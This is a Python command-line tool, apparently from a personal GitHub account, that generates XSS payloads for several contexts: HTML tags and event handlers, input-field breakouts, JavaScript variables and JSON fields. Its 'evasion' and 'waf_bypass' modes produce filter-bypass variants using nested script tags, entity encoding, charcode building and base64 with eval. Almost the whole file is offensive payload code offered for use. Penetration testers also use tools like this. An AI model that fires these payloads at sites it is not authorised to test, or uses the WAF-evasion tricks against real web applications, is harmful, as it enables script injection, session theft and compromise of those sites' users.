# Author: Elisha Langat
# Email: elishalangat460@gmail.com
# GitHub: https://github.com/HACKLANZ

import random
import urllib.parse
import base64
import argparse

# --- XSS Payload Templates ---
def generate_basic_payloads(payload_text):
    tags = ['img', 'svg', 'iframe', 'math', 'body', 'details', 'a', 'button', 'input']
    events = ['onerror', 'onload', 'onclick', 'ontoggle', 'onfocus', 'onblur']
    quote_styles = ['"', "'", '']  # double, single, no quotes

    templates = set()

    for tag in tags:
        for event in events:
            for quote in quote_styles:
                if tag == 'img':
                    payload = f"<{tag} src=x {event}={quote}alert('{payload_text}'){quote}>"
                elif tag == 'svg':
                    payload = f"<{tag} {event}={quote}alert('{payload_text}'){quote}></{tag}>"
                elif tag == 'iframe':
                    payload = f"<{tag} src='javascript:alert({quote}{payload_text}{quote})'></{tag}>"
                else:
                    payload = f"<{tag} {event}={quote}alert('{payload_text}'){quote}>"
                templates.add(payload)

    # Also add standard script-based ones
    templates.add(f"<script>alert('{payload_text}')</script>")
    templates.add(f"<script>window['al'+'ert']('{payload_text}')</script>")
    templates.add(f"<script>eval('alert(\"{payload_text}\")');</script>")
    
    # If we don't have enough payloads, add more permutations
    while len(templates) < 50:
        for tag in tags:
            for event in events:
                for quote in quote_styles:
                    payload = f"<{tag} {event}={quote}alert('{payload_text}'){quote}>"
                    templates.add(payload)
                    if len(templates) >= 50:
                        break
            if len(templates) >= 50:
                break

    return list(templates)

def generate_js_var_payloads(payload_text):
    templates = [
        f"var x = '{payload_text}'; alert(x);",
        f"var y = \"{payload_text}\"; eval(y);",
        f"window.location='javascript:alert(\"{payload_text}\")';",
        f"var myFunc = function(){{alert('{payload_text}');}}; myFunc();",
    ]
    while len(templates) < 50:
        templates.append(f"var z = 'javascript:alert({payload_text})'; eval(z);")
    return templates

def generate_input_payloads(payload_text):
    templates = [
        f"\" autofocus onfocus=alert('{payload_text}') x=\"",
        f"' autofocus onfocus=alert('{payload_text}') x='",
        f"<input value=\"{payload_text}\" onfocus=alert('{payload_text}')>",
        f"<textarea onfocus=alert('{payload_text}')>{payload_text}</textarea>",
        f"<button onclick=alert('{payload_text}')>Click Me</button>",
    ]
    while len(templates) < 50:
        templates.append(f"<input value=\"{payload_text}\" onblur=alert('{payload_text}')>")
    return templates

def generate_json_payloads(payload_text):
    templates = [
        f"{{\"name\":\"<script>alert('{payload_text}')</script>\"}}",
        f"{{\"key\":\"<img src=x onerror=alert('{payload_text}')>\"}}",
        f"{{\"field\":\"{payload_text}\"}}",
        f"{{\"data\":\"<script>alert('{payload_text}')</script>\"}}",
    ]
    while len(templates) < 50:
        templates.append(f"{{\"field\":\"<img src=x onerror=alert('{payload_text}')>\"}}")
    return templates

def generate_evasion_payloads(payload_text):
    templates = [
        f"<scr<script>ipt>alert('{payload_text}')</scr</script>ipt>",
        f"<img src=1 href=1 onerror=&#97lert('{payload_text}')>",
        f"<script>eval(String.fromCharCode({generate_charcode_payload(f'alert({payload_text})')}))</script>",
        f"<iframe srcdoc=\"<script>alert('{payload_text}')</script>\"></iframe>",
    ]
    while len(templates) < 50:
        templates.append(f"<img src=x onerror=eval(atob('{base64.b64encode(f'alert({payload_text})'.encode()).decode()}'))>")
    return templates

def generate_user_interaction_payloads(payload_text):
    templates = [
        f"<input onblur=alert('{payload_text}') autofocus>",
        f"<button onclick=alert('{payload_text}')>Click Me</button>",
        f"<a href='#' onclick=alert('{payload_text}')>Click here</a>",
    ]
    while len(templates) < 50:
        templates.append(f"<button onfocus=alert('{payload_text}')>Focus Me</button>")
    return templates

def generate_waf_bypass_payloads(payload_text):
    b64_payload = base64.b64encode(f"alert('{payload_text}')".encode()).decode()
    templates = [
        f"<scr<script>ipt>alert('{payload_text}')</scr</script>ipt>",
        f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('{payload_text}')>",
        f"<svg><desc><![CDATA[<script>alert('{payload_text}')</script>]]></desc></svg>",
        f"<a href='j&#x61;vascript:alert({payload_text})'>Click</a>",
        f"<script>window['al'+'ert']('{payload_text}')</script>",
        f"<iframe srcdoc=\"<script>alert('{payload_text}')</script>\"></iframe>",
        f"<script src=data:text/javascript,alert('{payload_text}')></script>",
        f"<img src=x onerror=eval(atob('{b64_payload}'))>"
    ]
    while len(templates) < 50:
        templates.append(f"<iframe srcdoc=\"<script>alert('{payload_text}')</script>\"></iframe>")
    return templates

# --- Common Utility Functions ---
def encode_payload(payload, method):
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "html":
        return payload.replace("<", "&lt;").replace(">", "&gt;")
    elif method == "base64":
        return base64.b64encode(payload.encode()).decode()
    return payload

def generate_charcode_payload(text):
    return ",".join(str(ord(c)) for c in text)

def generate_payloads(text="XSS", count=10, context="basic", encode=None):
    payloads = set()

    # Dynamically generate payloads based on context
    if context == "basic":
        templates = generate_basic_payloads(text)
    elif context == "input":
        templates = generate_input_payloads(text)
    elif context == "js_var":
        templates = generate_js_var_payloads(text)
    elif context == "json":
        templates = generate_json_payloads(text)
    elif context == "evasion":
        templates = generate_evasion_payloads(text)
    elif context == "user_interaction":
        templates = generate_user_interaction_payloads(text)
    elif context == "waf_bypass":
        templates = generate_waf_bypass_payloads(text)
    else:
        templates = []

    # Max attempts to avoid infinite loops
    max_attempts = count * 5
    attempts = 0

    while len(payloads) < count and attempts < max_attempts:
        payload = random.choice(templates)
        if encode:
            payload = encode_payload(payload, encode)
        payloads.add(payload)
        attempts += 1

    if len(payloads) < count:
        print(f"[!] Only generated {len(payloads)} unique payload(s). Try different input or context.")

    return list(payloads)

def prompt_for_encoding():
    print("\nDo you want to encode the payloads?")
    print("1. None\n2. URL\n3. HTML\n4. Base64")
    choice = input("Select option [1-4]: ").strip()
    encode_map = {"1": None, "2": "url", "3": "html", "4": "base64"}
    return encode_map.get(choice, None)

# --- Main Execution ---
def main():
    context_options = ", ".join(["basic", "input", "js_var", "json", "evasion", "user_interaction", "waf_bypass"])

    parser = argparse.ArgumentParser(
        prog="xssgen",
        description=f"""XSS Payload Generator Tool

Available context types:
  - basic            General-purpose payloads
  - input            Payloads for HTML input fields
  - js_var           Payloads in JavaScript variable context
  - json             JSON injection-specific payloads
  - evasion          Payloads with filter/WAF evasion techniques
  - user_interaction Payloads requiring user actions (click, blur, etc.)
  - waf_bypass       Advanced payloads for bypassing WAFs

Example:
  python xssgen.py -t 'owned' -c waf_bypass -n 5
""",
        formatter_class=argparse.RawTextHelpFormatter,
        usage="python xssgen.py [-t TEXT] [-c CONTEXT] [-n COUNT]"
    )

    parser.add_argument("-t", "--text", help="Custom payload text", default="XSS")
    parser.add_argument("-c", "--context", choices=["basic", "input", "js_var", "json", "evasion", "user_interaction", "waf_bypass"], default="basic", help="Payload context type")
    parser.add_argument("-n", "--count", type=int, default=10, help="Number of payloads to generate")

    args = parser.parse_args()

    # Always prompt for encoding
    encode = prompt_for_encoding()

    results = generate_payloads(
        text=args.text,
        count=args.count,
        context=args.context,
        encode=encode
    )

    print(f"\n[+] Generated {len(results)} unique payload(s) with context '{args.context}':\n")
    for i, p in enumerate(results, 1):
        print(f"{i}. {p}")

if __name__ == "__main__":
    main()
